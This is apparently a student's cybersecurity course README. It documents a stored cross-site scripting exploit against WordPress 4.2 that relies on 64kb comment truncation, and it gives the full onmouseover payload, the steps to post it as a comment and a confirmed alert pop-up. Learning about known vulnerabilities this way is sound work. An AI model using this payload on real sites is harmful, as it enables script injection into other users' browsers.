# CSU
CyberSecurity University Assignments

Exploit 1
Wordpress version: 4.2

Issue
If the text entered into the comment field exceeds 64kb, the input gets truncated in the MySQL database.  This enables XSS capability.

1.  Use commnad with over 64kb worth of chartacters attached:  <a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>

2.  Entered data into comments field on WordPress page

3.  Command executed, in this case, a 'Hello World' pop up alert.

<img src="https://github.com/norcaldre/CSU/blob/master/Exploit1.gif?raw=true" width="800">
